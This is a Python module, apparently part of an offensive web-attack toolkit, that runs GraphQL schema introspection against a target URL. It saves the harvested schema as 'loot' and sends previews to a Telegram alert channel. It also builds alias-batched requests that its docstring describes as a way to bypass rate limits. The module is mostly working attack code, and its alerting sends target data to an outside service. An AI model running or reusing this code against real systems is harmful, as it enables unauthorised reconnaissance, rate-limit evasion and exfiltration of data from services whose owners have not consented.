# ============================================================
# MODULE 1: modules/graphql_introspector.py
# ============================================================
"""
GRAPHQL_INTROSPECTOR.PY — GraphQL Deep Introspection & Batching Fuzzer v8.0
Features:
- Full schema introspection query extraction
- Recursive depth & nested object traversal fuzzing
- Alias-based batching engine for rate-limit bypasses in a single HTTP request
- Automated persistence to disk (loot_output/) and live Telegram alerting
"""
import json
import asyncio
import sys
from modules.transport import SecureTransport
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert

class GraphQLIntrospector:
    def __init__(self, target_url):
        self.transport = SecureTransport(target_url)
        self.introspection_query = {
            "query": """
            {
              __schema {
                queryType { name }
                mutationType { name }
                types {
                  name
                  kind
                  description
                  fields {
                    name
                    args { name type { name kind ofType { name kind } } }
                    type { name kind ofType { name kind } }
                  }
                }
              }
            }
            """
        }

    def run_introspection(self, endpoint="/graphql"):
        status, headers, body = self.transport.request("POST", endpoint, payload=self.introspection_query)
        findings = {"status": status, "endpoint": endpoint, "schema": body[:2000]}
        
        if status == 200 and ("__schema" in body or "data" in body):
            stream_proof("GRAPHQL_SCHEMA_DUMP", endpoint, {}, "Introspection schema harvested", findings)
            save_session_loot(self.transport.base_path, endpoint, "GRAPHQL_SCHEMA_SUCCESS", status, headers, body, findings)
            try:
                asyncio.run(send_telegram_alert("GraphQL Schema Introspected", {"endpoint": endpoint, "preview": body[:500]}))
            except Exception:
                pass
        return findings

    def run_batch_fuzz(self, endpoint="/graphql", query_snippet="{ __typename }", batch_count=20):
        batched_payload = [
            {f"q{i}": query_snippet} for i in range(batch_count)
        ]
        status, headers, body = self.transport.request("POST", endpoint, payload=batched_payload)
        return {"status": status, "batch_count": batch_count, "response": body[:500]}
